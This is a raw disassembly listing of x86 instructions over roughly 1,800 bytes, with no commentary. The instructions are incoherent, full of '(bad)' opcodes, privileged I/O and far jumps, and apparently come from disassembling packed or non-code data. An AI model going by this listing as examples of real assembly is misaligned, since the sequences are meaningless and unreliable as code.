  48b207:	and    dh,BYTE PTR [ecx+edi*2]
  48b20a:	mov    al,ds:0x42003457
  48b20f:	add    al,0xb3
  48b211:	jne    0x48b1fc
  48b213:	scas   eax,DWORD PTR es:[edi]
  48b214:	scas   al,BYTE PTR es:[edi]
  48b215:	aaa    
  48b216:	cs push 0x40
  48b219:	(bad)  [edx]
  48b21b:	pop    es
  48b21c:	(bad)  
  48b21d:	cmp    BYTE PTR [ebx-0x20bf6e6a],ch
  48b223:	xchg   ebp,eax
  48b224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b225:	push   ecx
  48b226:	inc    eax
  48b227:	iret   
  48b228:	aas    
  48b229:	inc    edx
  48b22a:	shl    edx,0x82
  48b22d:	scas   eax,DWORD PTR es:[edi]
  48b22e:	push   edi
  48b22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b230:	ror    BYTE PTR [ebp+ebp*4+0x42],1
  48b234:	(bad)  
  48b235:	xchg   edx,eax
  48b236:	push   ss
  48b237:	xchg   ebx,eax
  48b238:	cmc    
  48b239:	scas   eax,DWORD PTR es:[edi]
  48b23a:	mov    bh,0x9a
  48b23c:	add    ah,bl
  48b23e:	call   0x458f5882
  48b243:	shl    BYTE PTR [esp+ebx*2],1
  48b246:	dec    eax
  48b247:	push   cs
  48b248:	das    
  48b249:	push   ss
  48b24a:	push   esi
  48b24b:	mov    ds:0x29d4f81,eax
  48b250:	inc    esi
  48b251:	jmp    0x48b22a
  48b253:	ficomp WORD PTR [edi]
  48b255:	xor    dh,BYTE PTR [esi+0x5c]
  48b258:	arpl   bx,si
  48b25a:	out    0x85,eax
  48b25c:	(bad)  
  48b25d:	lds    ebp,FWORD PTR [edx-0x31]
  48b260:	ja     0x48b249
  48b262:	cmp    BYTE PTR [edx+0x44b74acb],ch
  48b268:	or     al,0x99
  48b26a:	or     eax,0x32fff720
  48b26f:	test   al,bl
  48b271:	cmp    ch,BYTE PTR [ecx+0x3f]
  48b274:	addr16 push ebp
  48b276:	or     DWORD PTR [ebx-0x6330d8b7],edi
  48b27c:	xor    al,BYTE PTR [edx]
  48b27e:	jb     0x48b2b6
  48b280:	xlat   BYTE PTR ds:[ebx]
  48b281:	jne    0x48b286
  48b283:	pop    ss
  48b284:	sbb    bh,BYTE PTR [ebx-0x5be28a49]
  48b28a:	push   0xe93f6fef
  48b28f:	mov    al,0x40
  48b291:	mov    edx,0x1c6a3467
  48b296:	aad    0xb0
  48b298:	or     ah,BYTE PTR [edi+0x67]
  48b29b:	xor    al,dl
  48b29d:	mov    al,0x60
  48b29f:	jno    0x48b300
  48b2a1:	pop    es
  48b2a2:	iret   
  48b2a3:	pop    ss
  48b2a4:	jno    0x48b2a7
  48b2a6:	jb     0x48b2eb
  48b2a8:	inc    ebx
  48b2a9:	pop    ebx
  48b2aa:	sbb    ch,BYTE PTR [esi+0x37df2142]
  48b2b0:	fcom   DWORD PTR ds:0xe42c
  48b2b5:	xor    al,0x7
  48b2b7:	jg     0x48b282
  48b2b9:	xor    al,0xad
  48b2bb:	push   ebx
  48b2bc:	pop    es
  48b2bd:	dec    edi
  48b2be:	cmp    BYTE PTR [eax],bh
  48b2c0:	sub    al,0x2a
  48b2c2:	lods   eax,DWORD PTR ds:[esi]
  48b2c3:	(bad)  
  48b2c4:	xchg   ax,ax
  48b2c6:	mov    BYTE PTR [ebp-0x1a90c0f3],ah
  48b2cc:	mov    dh,0x20
  48b2ce:	shl    DWORD PTR [edi+0x7],1
  48b2d1:	jg     0x48b305
  48b2d3:	ret    
  48b2d4:	push   esp
  48b2d5:	or     eax,0x34e734cb
  48b2da:	jg     0x48b33d
  48b2dc:	jno    0x48b340
  48b2de:	add    DWORD PTR [edi-0x39f3edde],ebx
  48b2e4:	adc    bh,BYTE PTR [edi]
  48b2e6:	mov    cl,0x95
  48b2e8:	sbb    al,0x4
  48b2ea:	xchg   DWORD PTR [eax],esi
  48b2ec:	mov    edi,0x7455a1b5
  48b2f1:	cmp    BYTE PTR [edi-0x39],cl
  48b2f4:	or     al,0x98
  48b2f6:	mov    al,ds:0xd4822f41
  48b2fb:	ret    
  48b2fc:	sbb    ecx,edx
  48b2fe:	aaa    
  48b2ff:	aas    
  48b300:	ins    BYTE PTR es:[edi],dx
  48b301:	pop    ss
  48b302:	or     DWORD PTR [ecx+0x374217ef],ebp
  48b308:	mov    WORD PTR [eax+0x426f1a40],?
  48b30e:	(bad)  
  48b30f:	lods   eax,DWORD PTR ds:[esi]
  48b310:	adc    eax,0x777062c
  48b315:	sbb    al,0x7
  48b317:	test   eax,0x3f4f9f88
  48b31c:	sub    ecx,DWORD PTR [edi-0x3cb9a37b]
  48b322:	scas   eax,DWORD PTR es:[edi]
  48b323:	adc    BYTE PTR [edx-0x5d],al
  48b326:	mov    BYTE PTR [edi-0x48],ah
  48b329:	mov    DWORD PTR [edx-0x7b],ebx
  48b32c:	dec    edi
  48b32d:	(bad)  ds:0x92a10930
  48b333:	(bad)  
  48b335:	call   0xd730:0x7318d784
  48b33c:	stos   BYTE PTR es:[edi],al
  48b33d:	mov    dh,0xae
  48b33f:	mov    cl,0xdf
  48b341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b342:	push   esp
  48b343:	pop    ebx
  48b344:	pop    es
  48b345:	inc    eax
  48b346:	push   edi
  48b347:	lahf   
  48b348:	lods   al,BYTE PTR ds:[si]
  48b34a:	es popa 
  48b34c:	out    0x5f,eax
  48b34e:	cmc    
  48b34f:	push   es
  48b350:	mov    ds:0x4c7f5f80,eax
  48b355:	and    eax,0x34c7b153
  48b35a:	xor    dl,ah
  48b35c:	add    al,ch
  48b35e:	push   esi
  48b35f:	call   FWORD PTR [esi+0x46b628b7]
  48b365:	adc    DWORD PTR [edi-0x11],0x2d290ab1
  48b36c:	out    0x62,eax
  48b36e:	sbb    eax,0xca2aadd0
  48b373:	outs   dx,DWORD PTR ds:[esi]
  48b374:	bound  ecx,QWORD PTR [eax]
  48b376:	and    DWORD PTR [edx-0x29],0x5036316f
  48b37d:	sub    al,0x1f
  48b37f:	xor    eax,0x60d6cd4f
  48b384:	and    BYTE PTR [edi],ah
  48b386:	push   edi
  48b387:	inc    eax
  48b388:	mov    gs,ebp
  48b38a:	pop    eax
  48b38b:	(bad)  
  48b38c:	(bad)  
  48b38d:	xor    al,0x2a
  48b38f:	mov    al,ds:0xaf34b935
  48b394:	stos   BYTE PTR es:[edi],al
  48b395:	adc    eax,0xc7a7d69c
  48b39a:	xchg   ebp,eax
  48b39b:	xor    BYTE PTR [edi+esi*4-0x271810ed],0x85
  48b3a3:	inc    ebp
  48b3a4:	mov    bh,0xaf
  48b3a6:	xchg   edi,eax
  48b3a7:	ins    DWORD PTR es:[edi],dx
  48b3a8:	pusha  
  48b3a9:	adc    DWORD PTR [eax-0x7ab70a89],ebx
  48b3af:	(bad)  
  48b3b1:	xor    al,0x2
  48b3b3:	inc    edi
  48b3b4:	test   DWORD PTR [edx-0x5c189850],esp
  48b3ba:	mov    DWORD PTR [eax+eax*4+0x47],edx
  48b3be:	xchg   ebx,eax
  48b3bf:	or     DWORD PTR [ebx-0x68e097b2],esp
  48b3c5:	sub    ebx,DWORD PTR [ecx+0x456f67ad]
  48b3cb:	inc    ebp
  48b3cc:	inc    esp
  48b3cd:	inc    ebp
  48b3ce:	pop    edx
  48b3cf:	enter  0x3921,0xe7
  48b3d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b3d4:	mov    dh,0x2e
  48b3d6:	pusha  
  48b3d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b3d8:	jg     0x48b412
  48b3da:	adc    BYTE PTR [esi+0x5a],bl
  48b3dd:	pop    ebx
  48b3de:	(bad)  
  48b3e0:	nop
  48b3e1:	or     dl,BYTE PTR [edx]
  48b3e3:	aam    0x8f
  48b3e5:	aaa    
  48b3e6:	or     eax,0x6aea0aad
  48b3eb:	mov    edi,0x6a8b0f00
  48b3f0:	(bad)  
  48b3f1:	aaa    
  48b3f2:	cmp    eax,esp
  48b3f4:	mov    dl,al
  48b3f6:	popa   
  48b3f7:	sub    esi,edi
  48b3f9:	adc    al,0x52
  48b3fb:	mov    DWORD PTR [ecx+0x1f],ebx
  48b3fe:	das    
  48b3ff:	inc    ebp
  48b400:	mov    dh,0x42
  48b402:	pusha  
  48b403:	dec    edi
  48b404:	iret   
  48b405:	xchg   edi,eax
  48b406:	push   0xefc08d60
  48b40b:	inc    ecx
  48b40c:	sub    eax,0x7874420
  48b411:	rol    cl,0x4c
  48b414:	push   0x56da320f
  48b419:	mov    BYTE PTR [ecx-0x9],bl
  48b41c:	ret    0x126a
  48b41f:	mov    ch,0xaf
  48b421:	aaa    
  48b422:	les    esi,FWORD PTR [esi]
  48b424:	adc    cl,BYTE PTR [edi+0x4f4f8f8b]
  48b42a:	lods   al,BYTE PTR ds:[esi]
  48b42b:	cwde   
  48b42c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b42d:	xlat   BYTE PTR ds:[ebx]
  48b42e:	aaa    
  48b42f:	xor    BYTE PTR [eax-0x3b405266],0x92
  48b436:	punpckhbw mm6,mm7
  48b439:	cmp    BYTE PTR [eax],al
  48b43b:	inc    ebx
  48b43c:	add    al,0x30
  48b43e:	and    DWORD PTR ds:0xe13231b6,edx
  48b444:	push   edx
  48b445:	sbb    ah,al
  48b447:	ja     0x48b48a
  48b449:	arpl   WORD PTR [ebx+0x6],cx
  48b44c:	cdq    
  48b44d:	(bad)  
  48b44e:	out    0x44,eax
  48b450:	inc    esp
  48b451:	push   ss
  48b452:	jo     0x48b4ac
  48b454:	pop    ebp
  48b455:	ja     0x48b48d
  48b457:	mov    eax,ds:0x1fa91954
  48b45c:	bswap  ebx
  48b45e:	or     cl,BYTE PTR [ecx-0x6d]
  48b461:	out    0x33,al
  48b463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b464:	jno    0x48b4a6
  48b466:	sbb    edi,0x7
  48b469:	mov    cl,0x82
  48b46b:	mov    bl,BYTE PTR [edx-0x51]
  48b46e:	inc    edi
  48b46f:	adc    BYTE PTR [edx],0xc2
  48b472:	xchg   edi,eax
  48b473:	xchg   DWORD PTR [edi+0x29],ecx
  48b476:	loopne 0x48b43b
  48b478:	(bad)  
  48b479:	mov    ds:0xd1a00316,eax
  48b47e:	das    
  48b47f:	out    dx,eax
  48b480:	imul   edx,eax,0xffffffb3
  48b483:	in     al,0x1f
  48b485:	mov    edi,0x2e5c815f
  48b48a:	jbe    0x48b4f2
  48b48c:	daa    
  48b48d:	inc    ebx
  48b48e:	cmp    DWORD PTR [edx+ebp*2],eax
  48b491:	and    edi,ecx
  48b493:	inc    edx
  48b494:	aaa    
  48b495:	in     al,dx
  48b496:	add    eax,0x452b7b06
  48b49b:	daa    
  48b49c:	add    DWORD PTR [ecx-0x39],0xffffffa2
  48b4a0:	inc    eax
  48b4a1:	or     al,0x5c
  48b4a3:	inc    esp
  48b4a4:	lahf   
  48b4a5:	out    0x14,eax
  48b4a7:	mov    dl,bl
  48b4a9:	(bad)  
  48b4aa:	ja     0x48b4b6
  48b4ac:	push   esi
  48b4ad:	mov    ch,0x98
  48b4af:	movzx  ecx,WORD PTR [edi]
  48b4b2:	loopne 0x48b4e4
  48b4b4:	hlt    
  48b4b5:	xor    BYTE PTR [ebx-0x74ead791],al
  48b4bb:	cwde   
  48b4bc:	xor    esi,DWORD PTR [edi+0x35]
  48b4bf:	xor    al,0x18
  48b4c1:	push   ds
  48b4c2:	fild   WORD PTR [ebx-0x39]
  48b4c5:	iret   
  48b4c6:	in     al,dx
  48b4c7:	mov    edx,0xfecf6a27
  48b4cc:	or     eax,DWORD PTR [ecx]
  48b4ce:	mov    edx,DWORD PTR [esi+0x3d]
  48b4d1:	(bad)  
  48b4d2:	addr16 xchg edi,eax
  48b4d4:	imul   eax,DWORD PTR [edx],0x450f7434
  48b4da:	mov    edi,0x4166b0b4
  48b4df:	imul   DWORD PTR [esi-0x285d2f36]
  48b4e5:	addr16 inc esp
  48b4e7:	and    BYTE PTR [esi+ebx*2+0x2427e742],ah
  48b4ee:	arpl   WORD PTR [ebx+0x2da8f794],ax
  48b4f4:	xchg   dh,dl
  48b4f6:	inc    edi
  48b4f7:	(bad)  
  48b4f8:	scas   eax,DWORD PTR es:[edi]
  48b4f9:	and    DWORD PTR [ebp+0x7f275158],eax
  48b4ff:	lock sub BYTE PTR ds:0x73526a4,ch
  48b506:	mov    ebx,0x87f68374
  48b50b:	lahf   
  48b50c:	mov    es,WORD PTR [edi+0x5362d44b]
  48b512:	aaa    
  48b513:	or     BYTE PTR [esp+edx*2-0x5f],cl
  48b517:	inc    edi
  48b519:	inc    edx
  48b51a:	xchg   edx,eax
  48b51b:	lock adc al,0x3a
  48b51e:	das    
  48b51f:	sti    
  48b520:	mov    cs,WORD PTR [edx+0x46]
  48b523:	push   0xf
  48b525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b526:	xor    DWORD PTR [edi],esp
  48b528:	pusha  
  48b529:	aad    0x22
  48b52b:	pop    ds
  48b52c:	outs   dx,BYTE PTR ds:[esi]
  48b52d:	inc    esi
  48b52e:	dec    ebx
  48b52f:	inc    edi
  48b530:	or     al,0x2f
  48b532:	inc    ebp
  48b533:	outs   dx,DWORD PTR ds:[esi]
  48b534:	mov    DWORD PTR [edx-0x2b],esp
  48b537:	mov    al,0xf
  48b539:	pop    ss
  48b53a:	ins    DWORD PTR es:[edi],dx
  48b53b:	lea    ecx,[esi+0x5b]
  48b53e:	pop    DWORD PTR [ecx+0x7882c35]
  48b544:	jg     0x48b4e0
  48b546:	inc    ebp
  48b547:	sub    eax,0x52f78720
  48b54c:	push   0xa0b7b126
  48b551:	push   esp
  48b552:	lods   al,BYTE PTR ds:[esi]
  48b553:	fldcw  WORD PTR [edi+0x17]
  48b556:	cwde   
  48b557:	sbb    BYTE PTR [esi],al
  48b559:	aaa    
  48b55a:	pop    ds
  48b55b:	pop    edi
  48b55c:	cmp    DWORD PTR [ebp+0x3f503429],ebp
  48b562:	das    
  48b563:	rcr    BYTE PTR [edx-0x38e8e2b4],cl
  48b569:	lods   al,BYTE PTR ds:[esi]
  48b56a:	or     ch,BYTE PTR [ebx-0x6d9810bf]
  48b570:	mov    al,0xa8
  48b572:	dec    esp
  48b573:	ja     0x48b536
  48b575:	(bad)  
  48b576:	shl    DWORD PTR [eax+0x629a6fbf],1
  48b57c:	push   ss
  48b57d:	mov    ch,0xf
  48b57f:	(bad)  
  48b580:	xor    eax,0xd2342ea4
  48b585:	(bad)  
  48b586:	and    dl,al
  48b588:	ror    BYTE PTR [ecx],cl
  48b58a:	stos   DWORD PTR es:[edi],eax
  48b58b:	(bad)  
  48b58c:	scas   al,BYTE PTR es:[edi]
  48b58d:	test   eax,0x93b6de80
  48b592:	and    eax,DWORD PTR [edi+0x37]
  48b595:	push   0x31891361
  48b59a:	daa    
  48b59b:	mov    ah,0x20
  48b59d:	leave  
  48b59e:	ror    bh,1
  48b5a0:	inc    ebx
  48b5a1:	jg     0x48b604
  48b5a3:	adc    edx,esp
  48b5a5:	xchg   esp,eax
  48b5a6:	dec    edi
  48b5a7:	adc    ecx,DWORD PTR [edx+0x17d5bd65]
  48b5ad:	pop    ss
  48b5ae:	outs   dx,DWORD PTR ds:[esi]
  48b5af:	pop    eax
  48b5b0:	adc    BYTE PTR [edx],bl
  48b5b2:	ror    BYTE PTR [edi+0x58],0x85
  48b5b6:	or     BYTE PTR [ebp+0x6262afff],0xc0
  48b5bd:	popw   ss
  48b5bf:	ss scas eax,DWORD PTR es:[edi]
  48b5c1:	outs   dx,DWORD PTR ds:[esi]
  48b5c2:	jne    0x48b571
  48b5c4:	add    dl,ah
  48b5c6:	dec    edi
  48b5c7:	ror    BYTE PTR [si-0x16],1
  48b5cb:	mov    BYTE PTR [edx-0x4aef15f1],dl
  48b5d1:	and    al,BYTE PTR [edi-0x3554e5e1]
  48b5d7:	(bad)  
  48b5d8:	xchg   edi,eax
  48b5d9:	mov    al,ds:0x47e265d6
  48b5de:	(bad)
  48b5e2:	(bad)
  48b5e5:	xor    al,BYTE PTR [eax+0x34d73115]
  48b5eb:	sbb    al,al
  48b5ed:	pusha  
  48b5ee:	outs   dx,DWORD PTR ds:[esi]
  48b5ef:	out    0x4d,eax
  48b5f1:	shl    BYTE PTR [esi+0x6a],1
  48b5f4:	out    dx,eax
  48b5f5:	push   edi
  48b5f6:	test   DWORD PTR ds:0xc775a0a,esi
  48b5fc:	mov    al,ds:0x874f3146
  48b601:	cmp    ch,BYTE PTR [eax+0x77ef6275]
  48b607:	sub    BYTE PTR [eax],bh
  48b609:	and    dh,BYTE PTR [eax]
  48b60b:	pop    ss
  48b60c:	inc    edi
  48b60d:	jno    0x48b657
  48b60f:	xchg   DWORD PTR [esi-0x31],ebx
  48b612:	inc    edi
  48b613:	mov    ds:0x1552105c,al
  48b618:	addr16 pop ss
  48b61a:	mov    cl,0x9
  48b61c:	add    dh,BYTE PTR [ebx+0x36]
  48b61f:	push   DWORD PTR [ebx]
  48b621:	aas    
  48b622:	push   0xd782b494
  48b627:	pop    es
  48b628:	push   esp
  48b629:	and    al,0x68
  48b62b:	push   ebp
  48b62c:	(bad)  
  48b62d:	(bad)  
  48b62e:	jmp    0x48b608
  48b630:	sbb    DWORD PTR ds:[edi],0x5a701f87
  48b637:	or     bl,BYTE PTR [ebp+0x27]
  48b63a:	aaa    
  48b63b:	stos   DWORD PTR es:[edi],eax
  48b63c:	xchg   ecx,eax
  48b63d:	aam    0x72
  48b63f:	cmp    BYTE PTR [edi],dh
  48b641:	mov    DWORD PTR [ecx+0x436f4b2a],esp
  48b647:	fadd   DWORD PTR [ebp+0x7778104]
  48b64d:	or     BYTE PTR [eax+0x11],ch
  48b650:	or     DWORD PTR [edi+0x58523582],edi
  48b656:	out    0xff,eax
  48b658:	pop    DWORD PTR [edi]
  48b65a:	mov    eax,ds:0x2307c49b
  48b65f:	(bad)  [esi-0x7860b68c]
  48b665:	adc    edx,DWORD PTR [esi-0x3a]
  48b668:	inc    eax
  48b669:	and    DWORD PTR [ebp+0x402e35bf],0x77270ba1
  48b673:	xor    al,BYTE PTR [eax+0x44372b15]
  48b679:	add    DWORD PTR [edx+0x28],ebp
  48b67c:	aas    
  48b67d:	inc    ebx
  48b67e:	xchg   DWORD PTR [edi],ecx
  48b680:	lea    esp,[edx+ebp*4+0x7]
  48b684:	xor    eax,0x809115c7
  48b689:	enter  0xbf30,0x5b
  48b68d:	lods   al,BYTE PTR ds:[esi]
  48b68e:	xchg   edx,eax
  48b68f:	and    BYTE PTR [edi+0x2242e716],0xd2
  48b696:	fisub  DWORD PTR [edi-0x39]
  48b699:	stos   DWORD PTR es:[edi],eax
  48b69a:	or     BYTE PTR [esi],dl
  48b69c:	sub    esi,DWORD PTR [edi+0x37481faf]
  48b6a2:	adc    DWORD PTR ds:0x20078f33,0x7f37adac
  48b6ac:	scas   eax,DWORD PTR es:[edi]
  48b6ad:	(bad)  
  48b6ae:	push   ebp
  48b6af:	inc    ecx
  48b6b0:	pusha  
  48b6b1:	daa    
  48b6b2:	inc    ecx
  48b6b3:	dec    esi
  48b6b4:	add    ebp,DWORD PTR [ecx+0x4a7bf7d0]
  48b6ba:	fadd   DWORD PTR [eax]
  48b6bc:	or     al,0x27
  48b6be:	aam    0x9
  48b6c0:	arpl   WORD PTR [ecx-0x61],si
  48b6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b6c4:	add    BYTE PTR [esi-0x77],al
  48b6c7:	ja     0x48b70e
  48b6c9:	mov    edi,0xb084fcaf
  48b6ce:	loopne 0x48b727
  48b6d0:	push   DWORD PTR [esi]
  48b6d2:	adc    dl,BYTE PTR ds:0xc5ffb006
  48b6d8:	mov    dl,cl
  48b6da:	add    bh,al
  48b6dc:	pop    ds
  48b6dd:	sbb    BYTE PTR [eax+edx*1],dl
  48b6e0:	adc    dh,BYTE PTR [ebx]
  48b6e2:	dec    edx
  48b6e3:	cmp    ch,BYTE PTR [ebp+0x35fe870c]
  48b6e9:	sub    BYTE PTR [ebx+ecx*1+0x60bb3fc0],ch
  48b6f0:	and    eax,0x75df171a
  48b6f5:	or     BYTE PTR [edx+edx*4],al
  48b6f8:	inc    ecx
  48b6f9:	pop    ebx
  48b6fa:	sbb    eax,0xe782a8c2
  48b6ff:	dec    edi
  48b700:	mov    eax,0x57803ad6
  48b705:	xlat   BYTE PTR ds:[ebx]
  48b706:	fstp   QWORD PTR [eax]
  48b708:	jno    0x48b75b
  48b70a:	fild   WORD PTR [edi-0x7fdbdf50]
  48b710:	pop    ds
  48b711:	mov    ?,esi
  48b713:	pop    eax
  48b714:	mov    ds:0x42e77a47,eax
  48b719:	lods   al,BYTE PTR ds:[esi]
  48b71a:	adc    esi,edx
  48b71c:	dec    ebp
  48b71d:	adc    cl,bh
  48b71f:	or     al,0x26
  48b721:	ins    DWORD PTR es:[edi],dx
  48b722:	jne    0x48b743
  48b724:	push   esi
  48b725:	inc    esp
  48b726:	repz sub cl,BYTE PTR [eax+0x14]
  48b72a:	ficom  DWORD PTR [edi-0x41]
  48b72d:	inc    edi
  48b72e:	jb     0x48b754
  48b730:	pop    edi
  48b731:	mov    al,0x17
  48b733:	inc    ecx
  48b734:	add    BYTE PTR [ecx],bh
  48b736:	inc    ebx
  48b737:	retf   
  48b738:	ror    BYTE PTR [edx+0x63],1
  48b73b:	mov    edi,0xac4f8593
  48b740:	(bad)  
  48b741:	push   edi
  48b742:	xchg   DWORD PTR [eax],ebx
  48b744:	mov    eax,ds:0x2f77589d
  48b749:	cmp    al,0x90
  48b74b:	xor    edx,edx
  48b74d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b74e:	inc    DWORD PTR [eax+ecx*4+0x60]
  48b752:	xchg   ecx,eax
  48b753:	xchg   esi,eax
  48b754:	pop    ss
  48b755:	aas    
  48b756:	lods   al,BYTE PTR cs:[esi]
  48b758:	xor    al,0x30
  48b75a:	jg     0x48b7db
  48b75c:	and    BYTE PTR [ebx],0x26
  48b75f:	or     al,0xcf
  48b761:	inc    esp
  48b762:	cs nop
  48b764:	(bad)  
  48b765:	ror    DWORD PTR [edi-0x72c6bac2],1
  48b76b:	sub    al,BYTE PTR [ecx]
  48b76d:	dec    ebx
  48b76e:	scas   eax,DWORD PTR es:[edi]
  48b76f:	adc    esp,DWORD PTR [ebp+0x46670ee5]
  48b775:	test   DWORD PTR [eax-0x3f],0xef3f4233
  48b77c:	adc    al,0x8e
  48b77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48b77f:	push   ebp
  48b780:	dec    edi
  48b781:	addr16 mov al,0x18
  48b784:	sbb    cl,BYTE PTR [ebp+0x358d4f6f]
  48b78a:	push   0x33
  48b78c:	inc    edi
  48b78d:	xchg   ebx,edx
  48b78f:	mov    edx,0xf73f3ab1
  48b794:	sub    bl,BYTE PTR [edx+0x35]
  48b797:	or     al,0x86
  48b799:	sysret 
  48b79b:	add    dl,cl
  48b79d:	adc    al,0x13
  48b79f:	aas    
  48b7a0:	xor    edx,DWORD PTR [ecx]
  48b7a2:	pop    ss
  48b7a3:	sbb    eax,DWORD PTR [ecx-0x2bcc7899]
  48b7a9:	and    DWORD PTR [eax+eiz*8],esi
  48b7ac:	pop    edi
  48b7ad:	jg     0x48b7e9
  48b7af:	adc    BYTE PTR ds:0xb717ede8,0x7
  48b7b6:	pop    es
  48b7b7:	ins    BYTE PTR es:[edi],dx
  48b7b8:	nop
  48b7b9:	inc    esi
  48b7ba:	aad    0xcf
  48b7bc:	adc    esp,DWORD PTR [edx+0x5d]
  48b7bf:	sub    DWORD PTR [ebp-0x49],edx
  48b7c2:	pxor   mm3,QWORD PTR [ecx]
  48b7c5:	push   cs
  48b7c6:	add    eax,0x2987cf2c
  48b7cb:	shl    cl,cl
  48b7cd:	adc    al,BYTE PTR [edi]
  48b7cf:	jbe    0x48b7a8
  48b7d1:	imul   ecx,DWORD PTR ss:0xa7078b0e,0x9831e93d
  48b7dc:	das    
  48b7dd:	retf   0xa5cb
  48b7e0:	leave  
  48b7e1:	ja     0x48b7ec
  48b7e3:	sbb    DWORD PTR [edi],0x36
  48b7e6:	add    bl,al
  48b7e8:	add    BYTE PTR [ebx-0x7a],ch
  48b7eb:	pop    ebx
  48b7ec:	je     0x48b7ff
  48b7ee:	mov    eax,ds:0x44334303
  48b7f3:	add    DWORD PTR [ebp+0x42c7775d],eax
  48b7f9:	fbld   TBYTE PTR [edi]
  48b7fb:	pop    ss
  48b7fc:	push   edi
  48b7fd:	fcmovnb st,st(3)
  48b7ff:	xor    ecx,DWORD PTR [edi]
  48b801:	xchg   edi,eax
  48b803:	xchg   BYTE PTR [esi-0x4d],dl
  48b806:	mov    BYTE PTR [ecx],bh
  48b808:	out    0x95,eax
  48b80a:	jmp    0x6743:0x3596692d
  48b811:	mov    esp,0xb3af26ed
  48b816:	inc    ecx
  48b817:	or     bl,bh
  48b819:	adc    eax,DWORD PTR [eax-0x71e76eec]
  48b81f:	inc    edi
  48b820:	sbb    DWORD PTR [eax+ecx*1],edi
  48b823:	mov    ebx,0xdd237fab
  48b828:	test   eax,esi
  48b82a:	sub    DWORD PTR [ebx],esi
  48b82c:	mov    ebx,0xb80ea4f2
  48b831:	in     eax,0x3e
  48b833:	inc    esp
  48b834:	jle    0x48b818
  48b836:	and    DWORD PTR [esp+edi*4],esp
  48b839:	adc    eax,0xc097734b
  48b83e:	imul   edi,DWORD PTR [ebx+ebx*2+0x456b2b3e],0xffffff87
  48b846:	inc    edi
  48b847:	shr    DWORD PTR ds:0xa6abdf63,0x6e
  48b84e:	pop    edi
  48b84f:	jp     0x48b8c9
  48b851:	aas    
  48b852:	ret    
  48b853:	mov    bl,0xaf
  48b855:	inc    ebx
  48b856:	dec    ebp
  48b857:	add    DWORD PTR [ebp+0x33c7afa4],0xe58f0471
  48b861:	data16 xor al,BYTE PTR [esi]
  48b864:	pop    ds
  48b865:	xor    esp,DWORD PTR [ebx-0x75]
  48b868:	aaa    
  48b869:	pop    eax
  48b86a:	mov    bh,0x2
  48b86c:	pop    ebx
  48b86d:	mov    esi,0xb46daf9f
  48b872:	add    eax,0xcb3f9f07
  48b877:	lock adc ch,BYTE PTR [ebx]
  48b87a:	mov    al,ds:0xc0463b0b
  48b87f:	fdiv   DWORD PTR [eax+0x3f453f5c]
  48b885:	prefetcht0 BYTE PTR [ebx+0x3b77eb91]
  48b88c:	jmp    0x835b:0x9e8740e3
  48b893:	pop    eax
  48b894:	icebp  
  48b895:	mov    ebp,0x13ab336f
  48b89a:	cmp    DWORD PTR [edi-0x3a9416d2],ebx
  48b8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b8a1:	iret   
  48b8a2:	das    
  48b8a3:	imul   edi,DWORD PTR [ecx],0xbf7ec436
  48b8a9:	cmp    BYTE PTR [ebx],dl
  48b8ab:	sbb    BYTE PTR [esi+0x435fcf03],al
  48b8b1:	mov    ch,0x44
  48b8b3:	xor    BYTE PTR [esi],0xd7
  48b8b6:	jmp    0x48b937
  48b8b8:	mov    ch,0x8d
  48b8ba:	in     eax,dx
  48b8bb:	imul   esp,DWORD PTR [edi],0xac6e635f
  48b8c1:	loope  0x48b92c
  48b8c3:	mov    ds:0x2912bf9f,eax
  48b8c8:	pop    eax
  48b8c9:	mov    ch,0xc7
  48b8cb:	(bad)  
  48b8cc:	mov    esp,0x23760b05
  48b8d1:	call   FWORD PTR [edi]
  48b8d3:	lahf   
  48b8d4:	mov    dh,0x5b
  48b8d6:	outs   dx,BYTE PTR ds:[esi]
  48b8d7:	das    
  48b8d8:	sbb    bl,bh
  48b8da:	xor    bl,BYTE PTR [esi+0x3f]
  48b8dd:	arpl   WORD PTR [ebx],ax
  48b8df:	scas   al,BYTE PTR es:[edi]
  48b8e0:	mov    dl,0xd7
  48b8e2:	xor    al,BYTE PTR [edi]
  48b8e4:	nop
  48b8e5:	mov    DWORD PTR [eax-0x47],esp
  48b8e8:	mov    edi,0x16317f38
  48b8ed:	lods   al,BYTE PTR ds:[esi]
  48b8ee:	pop    ebx
  48b8ef:	(bad)  
  48b8f0:	idiv   DWORD PTR [edi-0x1d]
  48b8f3:	mov    al,0x2d
  48b8f5:	and    bh,BYTE PTR [edi-0x51f43d21]
  48b8fb:	pop    eax
  48b8fc:	mov    al,0x4b
  48b8fe:	aas    
  48b8ff:	and    eax,DWORD PTR [ebx+0x3f]
  48b902:	cmp    edi,DWORD PTR [ebx+eax*4-0xc5800fc]
  48b909:	ret    0x29df
  48b90c:	pop    eax
  48b90d:	ret    
  48b90e:	pop    ebx
  48b90f:	call   FWORD PTR [edi+0x5f]
  48b912:	sub    esi,eax
  48b914:	xchg   ebx,eax
  48b915:	push   ds
  48b916:	div    BYTE PTR [ebx]
  48b918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b919:	adc    cl,BYTE PTR [edi+0x2b]
  48b91c:	jp     0x48b985
  48b91e:	jmp    FWORD PTR [ebx]
  48b920:	ins    DWORD PTR es:[edi],dx
  48b921:	xchg   DWORD PTR [ecx-0x48c07c20],esi
  48b927:	mov    edi,0xa7837871
  48b92c:	xor    esp,DWORD PTR [esi-0x41]
  48b92f:	mov    cs,WORD PTR [esi-0x54ce9e75]
  48b935:	push   DWORD PTR [eax]
  48b937:	jg     0x48b8fb
  48b939:	aam    0x8d
  48b93b:	in     al,0x31
  48b93d:	jle    0x48b98e
  48b93f:	ret    0xad02
  48b942:	inc    edi
  48b943:	cmp    esp,DWORD PTR [edi+0x511c7170]
